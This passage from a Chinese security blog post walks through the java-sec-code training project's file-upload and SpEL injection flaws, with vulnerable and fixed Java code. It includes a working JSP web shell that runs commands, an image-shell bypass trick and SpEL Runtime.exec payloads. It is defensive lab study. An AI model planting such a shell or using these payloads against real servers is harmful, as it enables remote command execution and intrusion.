+</code></pre><button class="code-block-unfold-btn"></button></div><p>文件上传到方法中，未判断文件的类型、扩展名等信息，也未对生成文件的文件名进行重置，只是直接将文件上传到文件保存目录中，使用测试文件成功上传。构造一句话木马：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;% if (&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;))) { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); } %&gt;
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>保存为shell.jsp进行上传，然后传入参数pwd=pass&amp;cmd=whoami</p><p>修复代码</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @PostMapping(&quot;/upload/picture&quot;)
+    @ResponseBody
+    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception {
+        if (multifile.isEmpty()) {
+            return &quot;Please select a file to upload&quot;;
+        }
+
+        String fileName = multifile.getOriginalFilename();
+        String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名
+        String mimeType = multifile.getContentType(); // 获取MIME类型
+        String filePath = UPLOADED_FOLDER + fileName;
+        File excelFile = convert(multifile);
+
+        // 判断文件后缀名是否在白名单内  校验1
+        String[] picSuffixList = {&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;};
+        boolean suffixFlag = false;
+        for (String white_suffix : picSuffixList) {
+            if (Suffix.toLowerCase().equals(white_suffix)) {
+                suffixFlag = true;
+                break;
+            }
+        }
+        if (!suffixFlag) {
+            logger.error(&quot;[-] Suffix error: &quot; + Suffix);
+            deleteFile(filePath);
+            return &quot;Upload failed. Illeagl picture.&quot;;
+        }
+
+        // 判断MIME类型是否在黑名单内 校验2
+        String[] mimeTypeBlackList = {
+                &quot;text/html&quot;,
+                &quot;text/javascript&quot;,
+                &quot;application/javascript&quot;,
+                &quot;application/ecmascript&quot;,
+                &quot;text/xml&quot;,
+                &quot;application/xml&quot;
+        };
+        for (String blackMimeType : mimeTypeBlackList) {
+            // 用contains是为了防止text/html;charset=UTF-8绕过
+            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) {
+                logger.error(&quot;[-] Mime type error: &quot; + mimeType);
+                deleteFile(filePath);
+                return &quot;Upload failed. Illeagl picture.&quot;;
+            }
+        }
+
+        // 判断文件内容是否是图片 校验3
+        boolean isImageFlag = isImage(excelFile);
+        deleteFile(randomFilePath);
+
+        if (!isImageFlag) {
+            logger.error(&quot;[-] File is not Image&quot;);
+            deleteFile(filePath);
+            return &quot;Upload failed. Illeagl picture.&quot;;
+        }
+
+        try {
+            // Get the file and save it somewhere
+            byte[] bytes = multifile.getBytes();
+            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());
+            Files.write(path, bytes);
+        } catch (IOException e) {
+            logger.error(e.toString());
+            deleteFile(filePath);
+            return &quot;Upload failed&quot;;
+        }
+
+        logger.info(&quot;[+] Safe file. Suffix: {}, MIME: {}&quot;, Suffix, mimeType);
+        logger.info(&quot;[+] Successfully uploaded {}&quot;, filePath);
+        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>判断为图片才允许上传，不过仍可通过其他方式绕过</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>copy 1.png/shell.jsp muma.png
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="spel表达式注入漏洞" tabindex="-1">SpEL表达式注入漏洞 <a class="header-anchor" href="#spel表达式注入漏洞" aria-label="Permalink to &quot;SpEL表达式注入漏洞&quot;">​</a></h3><p>Spring表达式语言（简称 <strong>SpEL</strong>，全称<strong>Spring Expression Language</strong>）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</p><p>spel语法中的<code>T()</code>操作符 , <code>T()</code>操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法<code>T(全限定类名).方法名()</code></p><h4 id="_1-spel-vuln1" tabindex="-1">1./spel/vuln1 <a class="header-anchor" href="#_1-spel-vuln1" aria-label="Permalink to &quot;1./spel/vuln1&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>   @RequestMapping(&quot;/spel/vuln1&quot;)
+    public String spel_vuln1(String value) {
+        ExpressionParser parser = new SpelExpressionParser();
+        return parser.parseExpression(value).getValue().toString();
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>可以通过spel表达式实现命令执行</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_2-spel-vuln2" tabindex="-1">2./spel/vuln2 <a class="header-anchor" href="#_2-spel-vuln2" aria-label="Permalink to &quot;2./spel/vuln2&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@RequestMapping(&quot;spel/vuln2&quot;)
+    public String spel_vuln2(String value) {
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        SpelExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(value, new TemplateParserContext());
+        Object x = expression.getValue(context);    // trigger vulnerability point
+        return x.toString();   // response
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>比第一关多了一个模板引擎，用#{}套上就好了</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> #{T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="漏洞修复-1" tabindex="-1">漏洞修复 <a class="header-anchor" href="#漏洞修复-1" aria-label="Permalink to &quot;漏洞修复&quot;">​</a></h4><p>修复代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>  @RequestMapping(&quot;spel/sec&quot;)
+    public String spel_sec(String value) {
+        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
+        SpelExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(value, new TemplateParserContext());
+        Object x = expression.getValue(context);
+        return x.toString();
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>使用 SimpleEvaluationContext进行加固，定义一个只读的上下文环境防止不安全的操作</p><!--]--><!--]--><!----><!----></article><!--]--><!--[--><!--[--><!--[--><!----><ul class="post-copyright" m="y-4"><li class="post-copyright-author"><strong>本文作者：</strong><span>北歌</span></li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://kinsey973.github.io/posts/java-sec-code" target="_blank" title="本文链接">https://kinsey973.github.io/posts/java-sec-code</a></li><li class="post-copyright-license"><strong>版权声明：</strong><span>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 ">CC BY-NC-SA</a> 许可协议。</span></li></ul><!--]--><!--]--><!--]--></div><!--]--></div><!----></div><!--[--><!--]--><!--[--><div class="post-nav"><div class="post-nav-item"><a href="/posts/Javaweb" class="post-nav-prev" title="Javaweb"><div class="icon" i-ri-arrow-left-s-line></div><span class="title truncate" text="sm">Javaweb</span></a></div><div class="post-nav-item"><a href="/posts/ctfshow-%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0" class="post-nav-next" title="ctfshow-文件上传"><span class="title truncate" text="sm">ctfshow-文件上传</span><div class="icon" i-ri-arrow-right-s-line></div></a></div></div><!--]--><!--[--><!--]--><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden comment yun-comment sm:p-6 lg:px-12 xl:px-16" flex="col" min-h="100px" bg="$va-c-bg-light" w="full" p="4"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><!--]--></div><!----></div><!--]--><template class="mt-4 lg:hidden"></template><!--[--><!--]--><!--[--><!--]--></div><!--]--></main><!--[--><button class="xl:hidden toc-btn shadow-md fixed yun-icon-btn z-20 bg-$va-c-bg-soft" opacity="75" right="4" bottom="19"><div i-ri-file-list-line></div></button><!----><aside flex="~ col" class="va-card yun-aside min-h-sm rounded-2" text="center" overflow="auto"><div class="w-full" flex="~ col" pb-2><!--[--><h2 m="t-6 b-2" font="serif black">文章目录</h2><div style="display:none;" data-v-d9db7c40><div class="content" data-v-d9db7c40><div class="outline-title" data-v-d9db7c40>本页</div><div class="outline-marker" data-v-d9db7c40></div><nav aria-labelledby="doc-outline-aria-label" data-v-d9db7c40><span id="doc-outline-aria-label" class="visually-hidden" data-v-d9db7c40> Table of Contents for current page </span><ul class="root va-toc relative z-1 css-i18n-toc" data-v-d9db7c40 data-v-0a3661f1><!--[--><!--]--></ul></nav></div></div><!--]--><div class="flex-grow"></div><!----></div></aside><!--]--><!--]--></div><footer flex="~ col" class="relative yun-footer va-footer px-4 py-4 pt-0 text-$va-c-text-light w-full mt-14" bg="white dark:$va-c-bg-soft" text="center sm"><div class="yun-cloud absolute top--10 left-0 right-0"><svg class="waves" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" fill="var(--yun-c-cloud)"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><!----><div class="copyright flex justify-center items-center gap-2" p="1"><span> © <!--[-->2023 - <!--]--> 2026</span><a class="animate-pulse inline-flex" href="https://www.yunyoujun.cn/sponsors/" target="_blank" title="Sponsor YunYouJun"><div class="i-ri-cloud-line"></div></a><span>北歌</span></div><div class="powered" m="2"><span>由 <a href="https://github.com/YunYouJun/valaxy.git" target="_blank" rel="noopener">Valaxy</a> <span class="op-60">v0.28.7</span> 驱动</span><span mx-1>|</span><span><span>主题</span><span mx-1>-</span><a href="https://github.com/YunYouJun/valaxy/tree/main/packages/valaxy-theme-yun.git" title="valaxy-theme-yun" target="_blank">Yun</a><span class="ml-1 op-60">v0.28.7</span></span></div><!--[--><div>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</div><div>本站访客数 <span id="busuanzi_value_site_uv"></span> 人次</div><!--]--><div class="yun-footer-gradient"></div></footer></div><!--]--></div><script>window.__INITIAL_STATE__='{"pinia":{"yun-app":{"bannerAnimationDone":false},"app":{"showLoading":true},"site":{},"routerStore":{}}}'</script><script type="application/ld+json" data-hid="schema-org-graph">{"@context":"https://schema.org","@graph":[{"@id":"https://kinsey973.github.io/#identity","@type":"Person","name":"北歌","url":"https://kinsey973.github.io/","image":{"@id":"https://kinsey973.github.io/#/schema/image/1"},"sameAs":["/atom.xml","https://music.163.com/#/user/home?id=3954596483","https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&jump_from=webapi","https://github.com/kinsey973","https://travellings.link"]},{"@id":"https://kinsey973.github.io/#website","@type":"WebSite","dateModified":"2025-06-26T20:58:52.000Z","datePublished":"2025-06-26T20:58:52.000Z","inLanguage":"zh-CN","name":"java-sec-code","url":"https://kinsey973.github.io/","publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#webpage","@type":"WebPage","dateModified":"2025-06-26T20:58:52.000Z","datePublished":"2025-06-26T20:58:52.000Z","description":"山行野宿，孤身万里","name":"java-sec-code","url":"https://kinsey973.github.io/","about":{"@id":"https://kinsey973.github.io/#identity"},"isPartOf":{"@id":"https://kinsey973.github.io/#website"},"potentialAction":[{"@type":"ReadAction","target":["https://kinsey973.github.io/"]}]},{"@id":"https://kinsey973.github.io/#article","dateModified":"2025-06-26T20:58:52.000Z","datePublished":"2025-06-26T20:58:52.000Z","description":"山行野宿，孤身万里","headline":"java-sec-code","inLanguage":"zh-CN","thumbnailUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png","@type":["Article","BlogPosting"],"author":{"@id":"https://kinsey973.github.io/#/schema/person/1"},"image":{"@id":"https://kinsey973.github.io/#/schema/image/2"},"isPartOf":{"@id":"https://kinsey973.github.io/#webpage"},"mainEntityOfPage":{"@id":"https://kinsey973.github.io/#webpage"},"publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#/schema/person/1","@type":"Person","name":"北歌","url":"https://valaxy.site"},{"@id":"https://kinsey973.github.io/#/schema/image/1","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png"},{"@id":"https://kinsey973.github.io/#/schema/image/2","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png"}]}</script>
+  
+</body>
+</html>
